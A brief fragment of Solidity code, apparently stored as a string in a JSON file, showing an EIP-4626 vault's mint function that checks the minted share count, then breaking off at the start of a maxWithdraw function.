/// @notice * EIP 4626 *\n    function mint(uint256 shares, address receiver)\n        public\n        returns (uint256 assets)\n    {\n        assets = previewMint(shares);\n        uint256 _shares = _deposit(assets, receiver);\n        require(_shares == shares, \"did not mint expected share count\");\n    }\n\n    // A user can withdraw whatever they hold\n    /// @notice * EIP 4626 *\n    function maxWithdraw(address owner)"
    }
  ]
}